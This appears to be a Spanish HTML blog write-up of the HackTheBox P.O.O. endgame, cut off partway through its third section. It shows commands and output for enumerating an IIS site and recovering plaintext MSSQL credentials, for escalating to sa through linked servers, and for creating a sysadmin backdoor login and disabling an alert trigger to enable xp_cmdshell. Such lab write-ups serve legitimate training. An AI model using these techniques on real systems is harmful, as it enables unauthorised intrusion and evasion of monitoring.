@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox P.O.O.</title>
+
+  <meta name="description" content="Resolución del endgame P.O.O. de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox P.O.O.">
+  <meta name="twitter:description" content="Resolución del endgame P.O.O. de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/poo.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox P.O.O.">
+  <meta property="og:description" content="Resolución del endgame P.O.O. de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/poo.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/poo.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox P.O.O." href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/endgames" title="GatoGamer1155" class="blog-button">EndGames</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#flag1">Recon</a></li>
+        <li><a href="#flag2">Huh?!</a></li>
+        <li><a href="#flag3">BackTrack</a></li>
+        <li><a href="#flag4">Foothold</a></li>
+        <li><a href="#flag5">p00ned</a></li>
+        <li><a href="#extra1">Extra 1</a></li>
+        <li><a href="#extra2">Extra 2</a></li>
+        <li><a href="#extra3">Extra 3</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/poo.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">P.O.O.</h2><br>
+  </header>
+  
+<section class="post" id="flag1">
+<br><h3 class="post-title">Recon</h3>
+<h4 class="post-title">POO{fcfb0767f5bd3cbc22f40ff5011ad555}</h4><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos entre ellos un servicio <code class="language-plaintext highlighter-rouge">http</code> y <code class="language-plaintext highlighter-rouge">mssql</code>, al lanzar scripts de reconocimiento podemos ver el <code class="language-plaintext highlighter-rouge">dominio</code> al que pertenece el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-sCV 10.13.38.11
+Nmap scan report for 10.13.38.11
+PORT     STATE SERVICE
+80/tcp   open  http
+1433/tcp open  ms-sql-s
+| ms-sql-ntlm-info: 
+|   10.13.38.11:1433: 
+|     Target_Name: POO
+|     NetBIOS_Domain_Name: POO
+|     NetBIOS_Computer_Name: COMPATIBILITY
+|     DNS_Domain_Name: intranet.poo
+|     DNS_Computer_Name: COMPATIBILITY.intranet.poo  
+|     DNS_Tree_Name: intranet.poo
+|_    Product_Version: 10.0.17763</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir la <code class="language-plaintext highlighter-rouge">web</code> en el navegador nos encontramos una página por defecto de un <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<a href="/endgames/poo/1.png" target="_blank"><div><p><img src="/endgames/poo/1.png"></p></div></a>   
+
+<p class="plain-text">Fuzzeando directorios y archivos en la web con <code class="language-plaintext highlighter-rouge">wfuzz</code> encontramos un archivo no es demasiado común <code class="language-plaintext highlighter-rouge">.ds_store</code>, que almacena información de donde se encuentra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.13.38.11/FUZZ --hc 404 -t 100  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.13.38.11/FUZZ
+Total requests: 56293
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000003:   </span><span class="az">301</span><span class="p">        1 L      10 W       149 Ch      "images"
+000000015:   </span><span class="az">301</span><span class="p">        1 L      10 W       145 Ch      "js"
+000000043:   </span><span class="az">301</span><span class="p">        1 L      10 W       147 Ch      "test"
+000000004:   </span><span class="ro">401</span><span class="p">        29 L     100 W      1293 Ch     "admin"
+000000011:   </span><span class="az">301</span><span class="p">        1 L      10 W       152 Ch      "templates"
+000000012:   </span><span class="az">301</span><span class="p">        1 L      10 W       150 Ch      "plugins"
+000000014:   </span><span class="az">301</span><span class="p">        1 L      10 W       149 Ch      "themes"
+000000112:   </span><span class="az">301</span><span class="p">        1 L      10 W       150 Ch      "uploads"
+000000391:   </span><span class="ve">200</span><span class="p">        31 L     55 W       703 Ch      "."
+000000231:   </span><span class="az">301</span><span class="p">        1 L      10 W       146 Ch      "dev"
+000000734:   </span><span class="az">301</span><span class="p">        1 L      10 W       150 Ch      "widgets"
+000001901:   </span><span class="az">301</span><span class="p">        1 L      10 W       151 Ch      "meta-inf"
+000008565:   </span><span class="ve">200</span><span class="p">        50 L     156 W      10244 Ch    ".ds_store"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <a href="https://github.com/Keramas/DS_Walk">ds_walk</a> para dumpear la infomación que este contiene, encontramos varias rutas, algunas en <code class="language-plaintext highlighter-rouge">md5</code> con una carpeta llamada <code class="language-plaintext highlighter-rouge">db</code> dentro de ellas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">ds_walk.py -u http://10.13.38.11/
+</span><span class="ve">[!] .ds_store file is present on the webserver.
+[+] Enumerating directories based on .ds_server file:</span><span class="p">
+----------------------------
+[!] http://10.13.38.11//admin
+[!] http://10.13.38.11//dev
+[!] http://10.13.38.11//iisstart.htm
+[!] http://10.13.38.11//Images
+[!] http://10.13.38.11//JS
+[!] http://10.13.38.11//META-INF
+[!] http://10.13.38.11//New folder
+[!] http://10.13.38.11//New folder (2)
+[!] http://10.13.38.11//Plugins
+[!] http://10.13.38.11//Templates
+[!] http://10.13.38.11//Themes
+[!] http://10.13.38.11//Uploads
+[!] http://10.13.38.11//web.config
+[!] http://10.13.38.11//Widgets
+----------------------------
+[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1
+[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc
+----------------------------
+[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/core
+[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/db
+[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/include
+[!] http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/src
+----------------------------
+[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/core
+[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/db
+[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/include  
+[!] http://10.13.38.11//dev/dca66d38fd916317687e1390a420c3fc/src
+----------------------------
+[!] http://10.13.38.11//Images/buttons
+[!] http://10.13.38.11//Images/icons
+[!] http://10.13.38.11//Images/iisstart.png
+----------------------------
+[!] http://10.13.38.11//JS/custom
+----------------------------
+[!] http://10.13.38.11//Themes/default
+----------------------------
+[!] http://10.13.38.11//Widgets/CalendarEvents
+[!] http://10.13.38.11//Widgets/Framework
+[!] http://10.13.38.11//Widgets/Menu
+[!] http://10.13.38.11//Widgets/Notifications
+----------------------------
+[!] http://10.13.38.11//Widgets/Framework/Layouts
+----------------------------
+[!] http://10.13.38.11//Widgets/Framework/Layouts/custom
+[!] http://10.13.38.11//Widgets/Framework/Layouts/default
+----------------------------
+</span><span class="ve">[*] Finished traversing. No remaining .ds_store files present.
+[*] Cleaning up .ds_store files saved to disk.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las carpetas con nombre de <code class="language-plaintext highlighter-rouge">hashes md5</code> las podemos crackear facilmente en <a href="https://crackstation.net/">crackstation</a>, sin embargo esto realmente no nos servirá de absolutamente nada</p>
+<a href="/endgames/poo/5.png" target="_blank"><div><p><img src="/endgames/poo/5.png"></p></div></a>
+
+<p class="plain-text">Además de ello, podemos ver que el <code class="language-plaintext highlighter-rouge">IIS</code> acepta <code class="language-plaintext highlighter-rouge">shortnames</code> o nombres cortos que nos permite saber si un <code class="language-plaintext highlighter-rouge">directorio</code> existe solo con sus <code class="language-plaintext highlighter-rouge">iniciales</code> y expresiones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -X OPTIONS -I </span><span class="am">'http://10.13.38.11/ta*~1*'</span><span class="p">  
+HTTP/1.1 200 OK
+Allow: OPTIONS, TRACE, GET, HEAD, POST
+Server: Microsoft-IIS/10.0
+Public: OPTIONS, TRACE, GET, HEAD, POST
+Date: Sun, 23 Apr 2023 17:28:37 GMT
+Content-Length: 0</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -X OPTIONS -I </span><span class="am">'http://10.13.38.11/te*~1*'</span><span class="p">  
+HTTP/1.1 404 Not Found
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+Date: Sun, 23 Apr 2023 17:28:48 GMT
+Content-Length: 1245</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <a href="https://github.com/lijiejie/IIS_shortname_Scanner">iis_shortname_scan</a> hacia un directorio de los 2 <code class="language-plaintext highlighter-rouge">db</code>, este logra encontrar un archivo el cual su nombre inicia por <code class="language-plaintext highlighter-rouge">db_co</code> seguido de algo y termina en <code class="language-plaintext highlighter-rouge">.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> iis_shortname_scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db  
+Server is vulnerable, please wait, scanning...
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
+[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
+[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
+----------------------------------------------------------------
+File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
+----------------------------------------------------------------
+0 Directories, 1 Files found in total
+Note that * is a wildcard, matches any character zero or more times.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Siguiendo esta lógica podemos crear un <code class="language-plaintext highlighter-rouge">diccionario</code> que solo tenga palabras las cuales inicien por <code class="language-plaintext highlighter-rouge">co</code>, ahora nos queda un diccionario de solo <code class="language-plaintext highlighter-rouge">1248</code> lineas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ grep </span><span class="am">"^co" </span><span class="p">/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt > fuzz.txt  
+
+</span><span class="ve">❯ wc</span><span class="p"> -l fuzz.txt
+1248 fuzz.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora fuzzeamos esa parte del archivo con <code class="language-plaintext highlighter-rouge">wfuzz</code> y despues de unos segundos encontramos que <code class="language-plaintext highlighter-rouge">connection</code> devuelve <code class="language-plaintext highlighter-rouge">200</code>, el nombre es <code class="language-plaintext highlighter-rouge">poo_connection.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w fuzz.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404 -t 100  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
+'Total requests: 1248
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000097:   </span><span class="ve">200</span><span class="p">        6 L      7 W        142 Ch      "connection"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer un simple <code class="language-plaintext highlighter-rouge">curl</code> a esa ruta encontramos la primera <code class="language-plaintext highlighter-rouge">flag</code> ademas de lo que parecen ser <code class="language-plaintext highlighter-rouge">credenciales</code> en texto claro probablemente para la <code class="language-plaintext highlighter-rouge">base de datos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl </span><span class="p">http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt  
+SERVER=10.13.38.11
+USERID=external_user
+DBNAME=POO_PUBLIC
+USERPWD=#p00Public3xt3rnalUs3r#
+
+Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Huh?!</h3>
+<h4 class="post-title">POO{88d829eb39f2d11697e689d779810d42}</h4><br>
+
+<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">1433</code> esta abierto, al utilizar las <code class="language-plaintext highlighter-rouge">credenciales</code> para <code class="language-plaintext highlighter-rouge">mssql</code> nos conecta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">intranet.poo/external_user:#p00Public3xt3rnalUs3r#@10.13.38.11  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235)
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando las <code class="language-plaintext highlighter-rouge">bases de datos</code>, ademas de las que vienen por <code class="language-plaintext highlighter-rouge">defecto</code> encontramos <code class="language-plaintext highlighter-rouge">POO_PUBLIC</code> aunque realmente no hay nada que nos pueda ser de interes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sysdatabases;  
+
+name
+----------
+master
+tempdb
+POO_PUBLIC
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario actual es <code class="language-plaintext highlighter-rouge">external_user</code> que fue como el que nos hemos conectado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select suser_name();  
+
+-------------
+external_user
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los <code class="language-plaintext highlighter-rouge">privilegios</code> que tenemos en este servidor ahora mismo solo es <code class="language-plaintext highlighter-rouge">conectarnos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select permission_name from fn_my_permissions(null, null);  
+
+permission_name
+---------------
+CONNECT SQL
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El nombre del <code class="language-plaintext highlighter-rouge">servidor</code> que esta actualmente en uso es <code class="language-plaintext highlighter-rouge">COMPATIBILITY\POO_PUBLIC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select @@servername;  
+
+------------------------
+COMPATIBILITY\POO_PUBLIC
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo eso no quiere decir que sea el unico, listando todos los nombres de <code class="language-plaintext highlighter-rouge">servidores</code> disponibles encontramos el servidor <code class="language-plaintext highlighter-rouge">COMPATIBILITY\POO_PUBLIC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select srvname from sysservers;  
+
+srvname
+------------------------
+COMPATIBILITY\POO_CONFIG
+COMPATIBILITY\POO_PUBLIC
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">exec at</code> podemos ejecutar todas las <code class="language-plaintext highlighter-rouge">querys</code> sql en el servidor <code class="language-plaintext highlighter-rouge">poo_config</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('select @@servername;') at [compatibility\poo_config];  
+
+------------------------
+COMPATIBILITY\POO_CONFIG
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta vez el <code class="language-plaintext highlighter-rouge">usuario</code> que ejecuta las <code class="language-plaintext highlighter-rouge">querys</code> en este servidor es <code class="language-plaintext highlighter-rouge">internal_user</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('select suser_name();') at [compatibility\poo_config];  
+
+-------------
+internal_user
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo los <code class="language-plaintext highlighter-rouge">privilegios</code> que tenemos en el servidor <code class="language-plaintext highlighter-rouge">poo_config</code> son exactamente los mismos que en <code class="language-plaintext highlighter-rouge">poo_public</code>, solo el permiso para conectarnos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('select permission_name from fn_my_permissions(null, null);') at [compatibility\poo_config];  
+
+permission_name
+---------------
+CONNECT SQL
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a probar es desde el servidor <code class="language-plaintext highlighter-rouge">poo_public</code> ejecutar una <code class="language-plaintext highlighter-rouge">query</code> en el servidor <code class="language-plaintext highlighter-rouge">poo_config</code> que a su vez ejecute una <code class="language-plaintext highlighter-rouge">query</code> de nuevo en el servidor <code class="language-plaintext highlighter-rouge">poo_public</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('exec(''select @@servername;'') at [compatibility\poo_public];') at [compatibility\poo_config];  
+
+------------------------
+COMPATIBILITY\POO_PUBLIC
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podria parecer lo mismo que ejecutar las <code class="language-plaintext highlighter-rouge">querys</code> directamente, sin embargo el ejecutarlas desde <code class="language-plaintext highlighter-rouge">poo_config</code> a <code class="language-plaintext highlighter-rouge">poo_public</code> este las ejecuta como el usuario <code class="language-plaintext highlighter-rouge">sa</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('exec(''select suser_name();'') at [compatibility\poo_public];') at [compatibility\poo_config];  
+
+--
+sa
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">sa</code> es <code class="language-plaintext highlighter-rouge">administrador</code> por lo que si ahora listamos los <code class="language-plaintext highlighter-rouge">privilegios</code> tenemos podemos hacer casi cualquier cosa ya que tenemos <code class="language-plaintext highlighter-rouge">todos</code> asignados</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('exec(''select permission_name from fn_my_permissions(null, null);'') at [compatibility\poo_public];') at [compatibility\poo_config];  
+
+-------------------------------
+CONNECT SQL
+SHUTDOWN
+CREATE ENDPOINT
+CREATE ANY DATABASE
+CREATE AVAILABILITY GROUP
+ALTER ANY LOGIN
+ALTER ANY CREDENTIAL
+ALTER ANY ENDPOINT
+ALTER ANY LINKED SERVER
+ALTER ANY CONNECTION
+ALTER ANY DATABASE
+ALTER RESOURCES
+ALTER SETTINGS
+ALTER TRACE
+ALTER ANY AVAILABILITY GROUP
+ADMINISTER BULK OPERATIONS
+AUTHENTICATE SERVER
+EXTERNAL ACCESS ASSEMBLY
+VIEW ANY DATABASE
+VIEW ANY DEFINITION
+VIEW SERVER STATE
+CREATE DDL EVENT NOTIFICATION
+CREATE TRACE EVENT NOTIFICATION
+ALTER ANY EVENT NOTIFICATION
+ALTER SERVER STATE
+UNSAFE ASSEMBLY
+ALTER ANY SERVER AUDIT
+CREATE SERVER ROLE
+ALTER ANY SERVER ROLE
+ALTER ANY EVENT SESSION
+CONNECT ANY DATABASE
+IMPERSONATE ANY LOGIN
+SELECT ALL USER SECURABLES
+CONTROL SERVER
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para trabajar mas comodamente, podemos crear un <code class="language-plaintext highlighter-rouge">usuario</code> pwned asignandole una contraseña y añadirle a sus roles <code class="language-plaintext highlighter-rouge">sysadmin</code> para tener todos los privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> exec('exec(''create login pwned with password = ''''password123#'''';'') at [compatibility\poo_public];') at [compatibility\poo_config];  
+SQL> exec('exec(''sp_addsrvrolemember ''''pwned'''', ''''sysadmin'''';'') at [compatibility\poo_public];') at [compatibility\poo_config];  
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos simplemente iniciar sesion con las <code class="language-plaintext highlighter-rouge">credenciales</code> definidas antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">intranet.poo/pwned:password123#@10.13.38.11
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (140 7235)
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ahora que somos <code class="language-plaintext highlighter-rouge">administradores</code> listamos todas las <code class="language-plaintext highlighter-rouge">bases de datos</code> nos encontramos con una que antes no podiamos ver, la base de datos <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sysdatabases;  
+
+name
+----------
+master
+tempdb
+model
+msdb
+POO_PUBLIC
+flag
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listamos las <code class="language-plaintext highlighter-rouge">tablas</code> de las base de datos <code class="language-plaintext highlighter-rouge">flag</code> y solo encontramos una tabla <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from flag.sys.tables;  
+
+name
+----
+flag
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente leemos su <code class="language-plaintext highlighter-rouge">contenido</code> y nos devuelve una columna <code class="language-plaintext highlighter-rouge">flag</code> con la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select * from flag.dbo.flag;
+
+flag
+----------------------------------------  
+b'POO{88d829eb39f2d11697e689d779810d42}'
+
+SQL></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag3">
+<br><h3 class="post-title">BackTrack</h3>
+<h4 class="post-title">POO{4882bd2ccfd4b5318978540d9843729f}</h4><br>
+
+<p class="plain-text">Somos <code class="language-plaintext highlighter-rouge">sa</code>, deberiamos poder habilitar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos, sin embargo al hacerlo nos devuelve <code class="language-plaintext highlighter-rouge">error</code> diciendo que se enviara una <code class="language-plaintext highlighter-rouge">alerta</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> enable_xp_cmdshell
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
+[-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified!
+[-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted.
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Debido a una politica no podemos habilitar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>, para ver el <code class="language-plaintext highlighter-rouge">trigger</code> que ocasiona esto podemos listar los nombres de los <code class="language-plaintext highlighter-rouge">server_triggers</code> habilitados</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sys.server_triggers;  
+
+name                
+-----------------
+ALERT_xp_cmdshell
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente <code class="language-plaintext highlighter-rouge">desactivar</code> el trigger y podemos habilitar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> disable trigger alert_xp_cmdshell on all server;
+SQL> enable_xp_cmdshell
+[*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  
